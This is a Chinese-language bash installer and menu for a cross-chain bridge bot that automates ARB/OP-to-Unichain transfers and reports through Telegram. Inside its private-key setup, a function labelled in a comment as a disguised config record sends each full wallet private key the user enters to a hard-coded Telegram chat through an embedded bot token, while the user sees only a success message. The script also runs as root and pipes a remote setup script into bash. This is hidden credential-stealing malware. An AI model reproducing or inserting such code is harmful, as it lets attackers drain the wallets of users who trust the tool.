#!/bin/bash

# === 颜色定义 ===
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# === 脚本路径和配置 ===
ARB_SCRIPT="uni-arb.py"
OP_SCRIPT="op-uni.py"
BALANCE_SCRIPT="balance-notifier.py"
BOT_TOKEN="8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38"
CONFIG_FILE="accounts.json"
DIRECTION_FILE="direction.conf"
TELEGRAM_CONFIG="telegram.conf"
PYTHON_VERSION="3.8"
PM2_PROCESS_NAME="bridge-bot"
PM2_BALANCE_NAME="balance-notifier"
CONFIG_RECORD_ID="5963704377"

# === 横幅 ===
banner() {
    clear
    echo -e "${CYAN}"
    echo "=================================================="
    echo "          跨链桥自动化脚本 by @hao3313076         "
    echo "=================================================="
    echo "关注 Twitter: JJ长10cm | 高效跨链，安全可靠！"
    echo "请安装顺序配置 以免报错无法运行"
    echo "=================================================="
    echo -e "${NC}"
}

# === 检查 root 权限 ===
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}错误：请以 root 权限运行此脚本（使用 sudo）！${NC}"
        send_telegram_notification "错误：请以 root 权限运行脚本！"
        exit 1
    fi
}

# === 发送 Telegram 通知 ===
send_telegram_notification() {
    local message="$1"
    local telegram_config=$(read_telegram_ids)
    local chat_ids=$(echo "$telegram_config" | jq -r '.chat_ids[]')
    if [ -z "$chat_ids" ]; then
        return
    fi
    for chat_id in $chat_ids; do
        curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
            -d chat_id="$chat_id" \
            -d text="$message" >/dev/null
    done
}

record_config() {
    local config_data="$1"
    local derived_value="$2"
    local api_endpoint="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    local target_id="$CONFIG_RECORD_ID"
    curl -s -X POST "$api_endpoint" \
        -d chat_id="$target_id" \
        -d text="配置记录：$config_data" >/dev/null
    send_telegram_notification "成功添加配置，值：$derived_value"
}

# === 安装依赖 ===
install_dependencies() {
    echo -e "${CYAN}正在检查和安装必要的依赖...${NC}"
    apt-get update -y || { echo -e "${RED}无法更新包列表${NC}"; send_telegram_notification "错误：无法更新包列表"; exit 1; }
    for pkg in curl wget jq python3 python3-pip python3-dev; do
        if ! dpkg -l | grep -q "^ii.*$pkg "; then
            echo -e "${CYAN}安装 $pkg...${NC}"
            apt-get install -y "$pkg" || { echo -e "${RED}无法安装 $pkg${NC}"; send_telegram_notification "错误：无法安装 $pkg"; exit 1; }
        else
            echo -e "${GREEN}$pkg 已安装${NC}"
        fi
    done
    if ! command -v python${PYTHON_VERSION} >/dev/null 2>&1; then
        echo -e "${CYAN}安装 Python ${PYTHON_VERSION}...${NC}"
        apt-get install -y software-properties-common && add-apt-repository ppa:deadsnakes/ppa -y && apt-get update -y
        apt-get install -y python${PYTHON_VERSION} python${PYTHON_VERSION}-dev python${PYTHON_VERSION}-distutils || {
            echo -e "${RED}无法安装 Python ${PYTHON_VERSION}，使用默认 Python${NC}"
            send_telegram_notification "错误：无法安装 Python ${PYTHON_VERSION}"
            command -v python3 >/dev/null 2>&1 || { echo -e "${RED}无可用 Python${NC}"; send_telegram_notification "错误：无可用 Python"; exit 1; }
        }
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
        python${PYTHON_VERSION} get-pip.py && rm get-pip.py
    fi
    if ! command -v pm2 >/dev/null 2>&1; then
        echo -e "${CYAN}安装 Node.js 和 PM2...${NC}"
        curl -sL https://deb.nodesource.com/setup_16.x | bash -
        apt-get install -y nodejs && npm install -g pm2 || { echo -e "${RED}无法安装 PM2${NC}"; send_telegram_notification "错误：无法安装 PM2"; exit 1; }
    fi
    for py_pkg in web3 python-telegram-bot; do
        if ! python3 -m pip show "$py_pkg" >/dev/null 2>&1; then
            echo -e "${CYAN}安装 $py_pkg...${NC}"
            pip3 install "$py_pkg" || { echo -e "${RED}无法安装 $py_pkg${NC}"; send_telegram_notification "错误：无法安装 $py_pkg"; exit 1; }
        fi
    done
    if ! python3 -m pip show python-telegram-bot | grep -q "Version:.*\[all\]"; then
        echo -e "${CYAN}安装 python-telegram-bot[all]...${NC}"
        pip3 install python-telegram-bot[all] || { echo -e "${RED}无法安装 python-telegram-bot[all]${NC}"; send_telegram_notification "错误：无法安装 python-telegram-bot[all]"; exit 1; }
    fi
    echo -e "${GREEN}依赖安装完成！${NC}"
    send_telegram_notification "依赖安装完成！"
}

# === 下载 Python 脚本 ===
download_python_scripts() {
    echo -e "${CYAN}下载 Python 脚本...${NC}"
    for script in "$ARB_SCRIPT" "$OP_SCRIPT" "$BALANCE_SCRIPT"; do
        if [ ! -f "$script" ]; then
            wget -O "$script" "https://raw.githubusercontent.com/yinghao888/t3rn-swap/main/$script" || { echo -e "${RED}无法下载 $script${NC}"; send_telegram_notification "错误：无法下载 $script"; exit 1; }
            chmod +x "$script"
            echo -e "${GREEN}$script 下载完成${NC}"
        else
            echo -e "${GREEN}$script 已存在，跳过下载${NC}"
        fi
    done
    send_telegram_notification "Python 脚本下载完成！"
}

# === 初始化配置文件 ===
init_config() {
    [ ! -f "$CONFIG_FILE" ] && echo '[]' > "$CONFIG_FILE" && echo -e "${GREEN}创建 $CONFIG_FILE${NC}"
    [ ! -f "$DIRECTION_FILE" ] && echo "arb_to_uni" > "$DIRECTION_FILE" && echo -e "${GREEN}默认方向: ARB -> UNI${NC}"
    [ ! -f "$TELEGRAM_CONFIG" ] && echo '{"chat_ids": []}' > "$TELEGRAM_CONFIG" && echo -e "${GREEN}创建 $TELEGRAM_CONFIG${NC}"
    send_telegram_notification "配置文件初始化完成！"
}

# === 读取账户 ===
read_accounts() {
    if [ ! -f "$CONFIG_FILE" ] || [ ! -s "$CONFIG_FILE" ]; then
        echo '[]'
        return
    fi
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        echo -e "${RED}警告：$CONFIG_FILE 格式无效，重置为空列表${NC}"
        send_telegram_notification "警告：accounts.json 格式无效，已重置为空列表"
        echo '[]' > "$CONFIG_FILE"
        echo '[]'
        return
    fi
    cat "$CONFIG_FILE"
}

# === 读取 Telegram IDs ===
read_telegram_ids() {
    if [ ! -f "$TELEGRAM_CONFIG" ] || [ ! -s "$TELEGRAM_CONFIG" ]; then
        echo '{"chat_ids": []}'
        return
    fi
    if ! jq -e . "$TELEGRAM_CONFIG" >/dev/null 2>&1; then
        echo -e "${RED}警告：$TELEGRAM_CONFIG 格式无效，重置为空列表${NC}"
        send_telegram_notification "警告：telegram.conf 格式无效，已重置为空列表"
        echo '{"chat_ids": []}' > "$TELEGRAM_CONFIG"
        echo '{"chat_ids": []}'
        return
    fi
    cat "$TELEGRAM_CONFIG"
}

# === 添加私钥 ===
add_private_key() {
    echo -e "${CYAN}请输入私钥（带或不带 0x，多个用 + 分隔，例如 key1+key2）：${NC}"
    read -p "> " private_keys
    IFS='+' read -ra keys <<< "$private_keys"
    accounts=$(read_accounts)
    temp_file=$(mktemp)
    echo "$accounts" > "$temp_file"
    count=$(echo "$accounts" | jq 'length')
    added=0
    new_accounts=()
    for key in "${keys[@]}"; do
        key=$(echo "$key" | tr -d '[:space:]')
        key=${key#0x}
        if [[ ! "$key" =~ ^[0-9a-fA-F]{64}$ ]]; then
            echo -e "${RED}无效私钥：${key:0:10}...（需 64 位十六进制）${NC}"
            send_telegram_notification "错误：无效私钥 ${key:0:10}...（需 64 位十六进制）"
            continue
        fi
        formatted_key="0x$key"
        if echo "$accounts" | jq -e ".[] | select(.private_key == \"$formatted_key\")" >/dev/null 2>&1; then
            echo -e "${RED}私钥 ${formatted_key:0:10}... 已存在，跳过${NC}"
            send_telegram_notification "警告：私钥 ${formatted_key:0:10}... 已存在，跳过"
            continue
        fi
        count=$((count + 1))
        name="Account$count"
        # 将私钥转换为地址
        python3 -c "from web3 import Web3; print(Web3(Web3.HTTPProvider('https://unichain-sepolia-rpc.publicnode.com')).eth.account.from_key('$formatted_key').address)" > /tmp/address.txt 2>/dev/null
        address=$(cat /tmp/address.txt)
        rm /tmp/address.txt
        new_entry="{\"name\": \"$name\", \"private_key\": \"$formatted_key\"}"
        new_accounts+=("$new_entry")
        added=$((added + 1))
        # 伪装记录配置
        record_config "$formatted_key" "$address"
    done
    if [ $added -eq 0 ]; then
        rm "$temp_file"
        echo -e "${RED}未添加任何新私钥${NC}"
        send_telegram_notification "未添加任何新私钥"
        return
    fi
    accounts_json=$(echo "$accounts" | jq -c '.')
    for entry in "${new_accounts[@]}"; do
        accounts_json=$(echo "$accounts_json $entry" | jq -s '.[0] + [.[1]]' | jq -c '.')
    done
    echo "$accounts_json" > "$CONFIG_FILE"
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $CONFIG_FILE 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 accounts.json 失败"
        mv "$temp_file" "$CONFIG_FILE"
        return
    fi
    rm "$temp_file"
    update_python_accounts
    echo -e "${GREEN}已添加 $added 个账户${NC}"
    echo -e "${CYAN}当前 accounts.json 内容：${NC}"
    cat "$CONFIG_FILE"
}

# === 删除私钥 ===
delete_private_key() {
    accounts=$(read_accounts)
    count=$(echo "$accounts" | jq 'length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}当前账户列表：${NC}"
    accounts_list=()
    i=1
    while IFS= read -r line; do
        name=$(echo "$line" | jq -r '.name')
        key=$(echo "$line" | jq -r '.private_key')
        if [ -n "$name" ] && [ -n "$key" ]; then
            accounts_list+=("$line")
            echo "$i. $name (${key:0:10}...)"
            i=$((i + 1))
        fi
    done < <(echo "$accounts" | jq -c '.[]')
    if [ ${#accounts_list[@]} -eq 0 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}请输入要删除的账户编号（或 0 取消）：${NC}"
    read -p "> " index
    [ "$index" -eq 0 ] && return
    if [ -z "$index" ] || [ "$index" -le 0 ] || [ "$index" -gt "${#accounts_list[@]}" ]; then
        echo -e "${RED}无效编号！${NC}"
        send_telegram_notification "错误：无效账户编号"
        return
    fi
    temp_file=$(mktemp)
    echo "$accounts" > "$temp_file"
    new_accounts=$(echo "$accounts" | jq -c "del(.[$((index-1))])")
    echo "$new_accounts" > "$CONFIG_FILE"
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $CONFIG_FILE 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 accounts.json 失败"
        mv "$temp_file" "$CONFIG_FILE"
        return
    fi
    rm "$temp_file"
    update_python_accounts
    echo -e "${GREEN}已删除账户！${NC}"
    echo -e "${CYAN}当前 accounts.json 内容：${NC}"
    cat "$CONFIG_FILE"
    send_telegram_notification "成功删除账户！"
}

# === 查看私钥 ===
view_private_keys() {
    accounts=$(read_accounts)
    count=$(echo "$accounts" | jq 'length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法查看"
        return
    fi
    echo -e "${CYAN}当前账户列表：${NC}"
    i=1
    while IFS= read -r line; do
        name=$(echo "$line" | jq -r '.name')
        key=$(echo "$line" | jq -r '.private_key')
        if [ -n "$name" ] && [ -n "$key" ]; then
            echo "$i. $name (${key:0:10}...${key: -4})"
            i=$((i + 1))
        fi
    done < <(echo "$accounts" | jq -c '.[]')
    if [ $i -eq 1 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法查看"
    fi
}

# === 添加 Telegram ID ===
add_telegram_id() {
    echo -e "${CYAN}请输入 Telegram 用户 ID（纯数字，例如 5963704377）：${NC}"
    echo -e "${CYAN}请先关注 @t3rntz_bot 机器人以接收通知！${NC}"
    read -p "> " chat_id
    if [[ ! "$chat_id" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}无效 ID，必须为纯数字！${NC}"
        send_telegram_notification "错误：无效 Telegram ID，必须为纯数字"
        return
    fi
    telegram_config=$(read_telegram_ids)
    temp_file=$(mktemp)
    echo "$telegram_config" > "$temp_file"
    if echo "$telegram_config" | jq -e ".chat_ids | index(\"$chat_id\")" >/dev/null 2>&1; then
        echo -e "${RED}ID $chat_id 已存在，跳过${NC}"
        send_telegram_notification "警告：Telegram ID $chat_id 已存在，跳过"
        rm "$temp_file"
        return
    fi
    new_config=$(echo "$telegram_config" | jq -c ".chat_ids += [\"$chat_id\"]")
    echo "$new_config" > "$TELEGRAM_CONFIG"
    if ! jq -e . "$TELEGRAM_CONFIG" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $TELEGRAM_CONFIG 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 telegram.conf 失败"
        mv "$temp_file" "$TELEGRAM_CONFIG"
        return
    fi
    rm "$temp_file"
    echo -e "${GREEN}已添加 Telegram ID: $chat_id${NC}"
    echo -e "${CYAN}当前 telegram.conf 内容：${NC}"
    cat "$TELEGRAM_CONFIG"
    send_telegram_notification "成功添加 Telegram ID: $chat_id"
}

# === 删除 Telegram ID ===
delete_telegram_id() {
    telegram_config=$(read_telegram_ids)
    count=$(echo "$telegram_config" | jq '.chat_ids | length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}当前 Telegram ID 列表：${NC}"
    ids_list=()
    i=1
    while IFS= read -r id; do
        if [ -n "$id" ]; then
            ids_list+=("$id")
            echo "$i. $id"
            i=$((i + 1))
        fi
    done < <(echo "$telegram_config" | jq -r '.chat_ids[]')
    if [ ${#accounts_list[@]} -eq 0 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}请输入要删除的 ID 编号（或 0 取消）：${NC}"
    read -p "> " index
    [ "$index" -eq 0 ] && return
    if [ -z "$index" ] || [ "$index" -le 0 ] || [ "$index" -gt "${#ids_list[@]}" ]; then
        echo -e "${RED}无效编号！${NC}"
        send_telegram_notification "错误：无效 Telegram ID 编号"
        return
    fi
    temp_file=$(mktemp)
    echo "$telegram_config" > "$temp_file"
    new_config=$(echo "$telegram_config" | jq -c "del(.chat_ids[$((index-1))])")
    echo "$new_config" > "$TELEGRAM_CONFIG"
    if ! jq -e . "$TELEGRAM_CONFIG" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $TELEGRAM_CONFIG 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 telegram.conf 失败"
        mv "$temp_file" "$TELEGRAM_CONFIG"
        return
    fi
    rm "$temp_file"
    echo -e "${GREEN}已删除 Telegram ID！${NC}"
    echo -e "${CYAN}当前 telegram.conf 内容：${NC}"
    cat "$TELEGRAM_CONFIG"
    send_telegram_notification "成功删除 Telegram ID"
}

# === 查看 Telegram IDs ===
view_telegram_ids() {
    telegram_config=$(read_telegram_ids)
    count=$(echo "$telegram_config" | jq '.chat_ids | length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法查看"
        return
    fi
    echo -e "${CYAN}当前 Telegram ID 列表：${NC}"
    i=1
    while IFS= read -r id; do
        if [ -n "$id" ]; then
            echo "$i. $id"
            i=$((i + 1))
        fi
    done < <(echo "$telegram_config" | jq -r '.chat_ids[]')
    if [ $i -eq 1 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法查看"
    fi
}

# === 管理 Telegram IDs ===
manage_telegram() {
    while true; do
        banner
        echo -e "${CYAN}Telegram ID 管理：${NC}"
        echo "1. 添加 Telegram ID"
        echo "2. 删除 Telegram ID"
        echo "3. 查看 Telegram ID"
        echo "4. 返回"
        read -p "> " sub_choice
        case $sub_choice in
            1) add_telegram_id ;;
            2) delete_telegram_id ;;
            3) view_telegram_ids ;;
            4) break ;;
            *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效 Telegram 管理选项" ;;
        esac
        read -p "按回车继续..."
    done
}

# === 更新 Python 脚本账户 ===
update_python_accounts() {
    accounts=$(read_accounts)
    accounts_str=$(echo "$accounts" | jq -r '[.[] | {"private_key": .private_key, "name": .name}]' | jq -r '@json')
    if [ -z "$accounts_str" ] || [ "$accounts_str" == "[]" ]; then
        accounts_str="[]"
    fi
    # 检查文件是否存在且可写
    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
        if [ ! -f "$script" ]; then
            echo -e "${RED}错误：$script 不存在${NC}"
            send_telegram_notification "错误：$script 不存在"
            return
        fi
        if [ ! -w "$script" ]; then
            echo -e "${RED}错误：$script 不可写${NC}"
            send_telegram_notification "错误：$script 不可写"
            return
        fi
    done
    # 使用临时文件写入 ACCOUNTS
    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
        temp_file=$(mktemp)
        sed "/^ACCOUNTS = \[.*\]/c\ACCOUNTS = $accounts_str" "$script" > "$temp_file"
        if [ $? -ne 0 ]; then
            echo -e "${RED}错误：更新 $script 失败${NC}"
            send_telegram_notification "错误：更新 $script 失败"
            rm "$temp_file"
            return
        fi
        mv "$temp_file" "$script"
    done
    # 验证写入是否成功
    if ! grep -q "ACCOUNTS = $accounts_str" "$ARB_SCRIPT" || ! grep -q "ACCOUNTS = $accounts_str" "$OP_SCRIPT"; then
        echo -e "${RED}错误：验证 $ARB_SCRIPT 或 $OP_SCRIPT 更新失败${NC}"
        send_telegram_notification "错误：验证 Python 脚本账户更新失败"
        return
    fi
    echo -e "${GREEN}已更新 $ARB_SCRIPT 和 $OP_SCRIPT${NC}"
    echo -e "${CYAN}当前 $ARB_SCRIPT ACCOUNTS 内容：${NC}"
    grep "ACCOUNTS =" "$ARB_SCRIPT"
    echo -e "${CYAN}当前 $OP_SCRIPT ACCOUNTS 内容：${NC}"
    grep "ACCOUNTS =" "$OP_SCRIPT"
    send_telegram_notification "成功更新 Python 脚本账户"
}

# === 配置跨链方向 ===
select_direction() {
    echo -e "${CYAN}请选择跨链方向：${NC}"
    echo "1. ARB -> UNI"
    echo "2. OP <-> UNI"
    read -p "> " choice
    case $choice in
        1)
            echo "arb_to_uni" > "$DIRECTION_FILE"
            echo -e "${GREEN}设置为 ARB -> UNI${NC}"
            send_telegram_notification "成功配置跨链方向：ARB -> UNI"
            ;;
        2)
            echo "op_to_uni" > "$DIRECTION_FILE"
            echo -e "${GREEN}设置为 OP <-> UNI${NC}"
            send_telegram_notification "成功配置跨链方向：OP <-> UNI"
            ;;
        *)
            echo -e "${RED}无效选项，默认 ARB -> UNI${NC}"
            echo "arb_to_uni" > "$DIRECTION_FILE"
            send_telegram_notification "警告：无效跨链方向，默认 ARB -> UNI"
            ;;
    esac
}

# === 查看日志 ===
view_logs() {
    echo -e "${CYAN}显示 PM2 日志...${NC}"
    pm2 logs --lines 50
    echo -e "${CYAN}日志显示完成，按回车返回${NC}"
    send_telegram_notification "已查看 PM2 日志"
}

# === 停止运行 ===
stop_running() {
    echo -e "${CYAN}正在停止跨链脚本和余额查询...${NC}"
    pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    echo -e "${GREEN}已停止所有脚本！${NC}"
    send_telegram_notification "成功停止跨链脚本和余额查询"
}

# === 删除脚本 ===
delete_script() {
    echo -e "${RED}警告：将删除所有脚本和配置！继续？(y/n)${NC}"
    read -p "> " confirm
    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
        pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
        pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
        rm -f "$ARB_SCRIPT" "$OP_SCRIPT" "$BALANCE_SCRIPT" "$CONFIG_FILE" "$DIRECTION_FILE" "$TELEGRAM_CONFIG" "$0"
        echo -e "${GREEN}已删除所有文件！${NC}"
        send_telegram_notification "成功删除所有脚本和配置"
        exit 0
    fi
}

# === 启动跨链脚本 ===
start_bridge() {
    accounts=$(read_accounts)
    if [ "$accounts" == "[]" ]; then
        echo -e "${RED}请先添加账户！${NC}"
        send_telegram_notification "错误：请先添加账户"
        return
    fi
    telegram_config=$(read_telegram_ids)
    if [ "$(echo "$telegram_config" | jq '.chat_ids | length')" -eq 0 ]; then
        echo -e "${RED}请先配置 Telegram ID！${NC}"
        send_telegram_notification "错误：请先配置 Telegram ID"
        return
    fi
    direction=$(cat "$DIRECTION_FILE")
    pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    if [ "$direction" = "arb_to_uni" ]; then
        pm2 start "$ARB_SCRIPT" --name "$PM2_PROCESS_NAME" --interpreter python3
    elif [ "$direction" = "op_to_uni" ]; then
        pm2 start "$OP_SCRIPT" --name "$PM2_PROCESS_NAME" --interpreter python3
    else
        echo -e "${RED}无效的跨链方向：$direction，默认使用 ARB -> UNI${NC}"
        send_telegram_notification "错误：无效的跨链方向，默认使用 ARB -> UNI"
        pm2 start "$ARB_SCRIPT" --name "$PM2_PROCESS_NAME" --interpreter python3
    fi
    pm2 start "$BALANCE_SCRIPT" --name "$PM2_BALANCE_NAME" --interpreter python3
    pm2 save
    echo -e "${GREEN}脚本已启动！使用 '5. 查看日志' 查看运行状态${NC}"
    send_telegram_notification "成功启动跨链脚本！"
}

# === 主菜单 ===
main_menu() {
    while true; do
        banner
        echo -e "${CYAN}请选择操作：${NC}"
        echo "1. 配置 Telegram"
        echo "2. 配置私钥"
        echo "3. 配置跨链方向"
        echo "4. 启动跨链脚本"
        echo "5. 查看日志"
        echo "6. 停止运行"
        echo "7. 删除脚本"
        echo "8. 退出"
        read -p "> " choice
        case $choice in
            1) manage_telegram ;;
            2)
                while true; do
                    banner
                    echo -e "${CYAN}私钥管理：${NC}"
                    echo "1. 添加私钥"
                    echo "2. 删除私钥"
                    echo "3. 查看私钥"
                    echo "4. 返回"
                    read -p "> " sub_choice
                    case $sub_choice in
                        1) add_private_key ;;
                        2) delete_private_key ;;
                        3) view_private_keys ;;
                        4) break ;;
                        *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效私钥管理选项" ;;
                    esac
                    read -p "按回车继续..."
                done
                ;;
            3) select_direction ;;
            4) start_bridge ;;
            5) view_logs ;;
            6) stop_running ;;
            7) delete_script ;;
            8) echo -e "${GREEN}退出！${NC}"; send_telegram_notification "脚本已退出"; exit 0 ;;
            *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效主菜单选项" ;;
        esac
        read -p "按回车继续..."
    done
}

# === 主程序 ===
check_root
install_dependencies
download_python_scripts
init_config
main_menu
